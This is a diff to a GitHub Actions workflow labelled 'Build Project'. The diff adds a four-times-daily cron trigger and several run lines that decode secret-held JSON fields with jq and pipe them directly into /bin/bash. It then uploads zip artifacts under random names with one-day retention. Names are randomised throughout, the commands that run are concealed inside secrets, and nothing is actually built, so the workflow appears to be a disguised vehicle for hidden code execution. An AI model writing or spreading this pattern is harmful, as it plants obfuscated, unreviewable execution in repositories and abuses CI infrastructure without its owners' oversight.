@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '28 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,14 +16,16 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          l20: ${{ secrets.l20 }}
+          gum1711: ${{ secrets.gum1711 }}
         run: |
-          printf '%s' "$l20" | jq -r .m876 | /bin/bash
-          printf '%s' "$qpar6" | jq -r .prol287 | /bin/bash
+          printf '%s' "$gum1711" | jq -r .pwd1291 | /bin/bash
+          printf '%s' "$lwazj78" | jq -r .dcvm59 | /bin/bash
+          echo $ieuh87 | jq -r .qcnz93964 | /bin/bash
+          printf '%s' "$omesd210" | jq -r .ttv8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: pz1gbdHY
+          name: hlwfminv
           path: "*.zip"
           retention-days: 1
